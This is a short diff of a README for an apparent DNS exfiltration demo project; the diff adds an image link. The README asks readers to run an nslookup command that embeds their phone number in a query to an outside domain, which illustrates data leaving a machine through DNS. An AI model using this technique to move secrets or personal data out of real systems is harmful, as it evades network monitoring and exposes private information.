@@ -1,5 +1,7 @@
 # DNS Exfiltration 
 
+![alt text](https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/DNS-EXFIL.png)
+
 Hi, if you're reading this, you probably were sent here from a text message after inputting a command. If you were not, I recommend running the following command in CMD:
 `nslookup text.YOURPHONENUMBER.dns-exfil.tech`
 
